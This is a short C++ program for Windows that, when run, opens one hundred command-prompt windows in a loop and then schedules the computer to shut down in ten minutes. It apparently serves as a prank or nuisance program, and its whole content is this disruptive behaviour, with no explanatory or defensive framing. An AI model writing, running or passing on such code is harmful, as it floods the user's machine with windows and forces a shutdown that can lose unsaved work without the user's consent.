#include <cstdlib>

int main() {
	for (int i = 1; i <= 100; ++i) {
		system("start cmd");
	}
	system("shutdown -s -t 600");
	return 0;
}
